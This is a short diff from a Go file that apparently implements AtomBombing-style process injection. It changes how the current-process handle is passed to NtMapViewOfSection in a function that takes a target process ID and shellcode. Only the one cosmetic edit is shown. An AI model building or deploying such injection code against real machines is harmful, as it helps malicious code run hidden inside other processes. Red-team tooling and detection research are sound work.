@@ -55,7 +55,7 @@ func atomBombingInject(pid uint32, shellcode []byte) error {
 	localSize := secSize
 	remoteSize := secSize
 	procNtMapViewOfSection.Call(
-		hSection, 0xFFFFFFFFFFFFFFFF,
+		hSection, ^uintptr(0),
 		uintptr(unsafe.Pointer(&localAddr)), 0, 0, 0,
 		uintptr(unsafe.Pointer(&localSize)), 2, 0, 0x04,
 	)
